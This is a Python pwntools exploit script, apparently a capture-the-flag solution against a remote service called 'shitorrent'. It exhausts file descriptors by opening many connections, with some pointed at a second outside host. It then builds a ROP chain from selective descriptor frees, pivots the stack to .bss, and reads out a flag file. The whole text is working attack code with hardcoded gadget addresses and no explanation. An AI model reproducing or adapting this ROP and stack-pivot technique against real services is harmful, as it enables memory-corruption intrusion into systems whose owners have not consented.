from pwn import *
import threading
import sys

def menu():
    p.recvuntil("flag\n")

# p = process("./shitorrent")
p = remote('34.214.75.168', 4747)

def dumb():
    host = '127.0.0.1'
    port = 1234
    # menu()
    p.sendline('a')
    # p.recvline()
    p.send(host.ljust(99, '\x00'))
    # p.recvline()
    p.send(str(port).ljust(99, '\x00'))

def add_node(admin):
    host = '34.220.34.155'
    port = None
    if admin:
        port = 8002
    else:
        port = 8001

    menu()
    p.sendline('a')
    p.recvline()
    p.sendline(host)
    p.recvline()
    p.sendline(str(port))

def remove_node(index):
    menu()
    p.sendline('r')
    p.sendline(str(index))

pop_rdi_ret = 0x4075e5
pop_rdx_rsi_ret = 0x468059
open_addr = 0x465680
flag_addr = 0x4a99ca
read_addr = 0x465840
write_addr = 0x465910

rop1 = [
pop_rdi_ret,
flag_addr,
pop_rdx_rsi_ret,
0,
0,
open_addr,
pop_rdi_ret,
0x4c1,
pop_rdx_rsi_ret,
0x40,
0x6DC420,
read_addr,
pop_rdi_ret,
0x1,
pop_rdx_rsi_ret,
0x40,
0x6DC420,
write_addr
]

payload = ''
for x in rop1:
    payload += p64(x)

bss_addr = 0x6d5300
pop_rbp_ret = 0x432768
leave_ret = 0x4a0383
pop_rsi_ret = 0x0000000000407888
pop_rsp_ret = 0x0000000000403368

rop = [
pop_rdx_rsi_ret,  # 0x0000000000407888
len(payload),
bss_addr,
read_addr,
pop_rsp_ret, # 0x0000000000403368
bss_addr,
]

for i in xrange(1216 - 3):
    dumb()

for i in xrange(1216 - 3):
    p.recvuntil('Failed')

print 'end...'

for x in rop:
    for i in xrange(64):
        add_node(True)

for j in range(len(rop)):
    xx = bin(rop[j])[2:][::-1].ljust(64, '0')
    for i in range(len(xx)):
        if xx[i] == '0':
            fd = 1216 + j * 64 + i
            remove_node(fd)

menu()
p.sendline('q')
p.send(payload)

p.interactive()